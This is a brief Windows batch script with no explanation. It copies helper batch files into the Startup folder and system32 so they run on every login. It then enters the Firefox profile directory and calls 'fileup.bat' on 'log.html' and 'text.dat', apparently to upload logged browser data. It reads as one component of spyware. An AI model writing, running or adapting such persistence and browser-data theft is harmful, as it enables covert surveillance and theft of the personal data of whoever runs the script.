@echo off
copy fileup.bat %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
copy starter.bat %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
copy fileup.bat C:\Windows\system32\fileup.bat
C:
cd %appdata%
cd Mozilla/Firefox/Profiles
cd *.default
cd datax
@echo off
fileup.bat log.html text.dat
@echo off
exit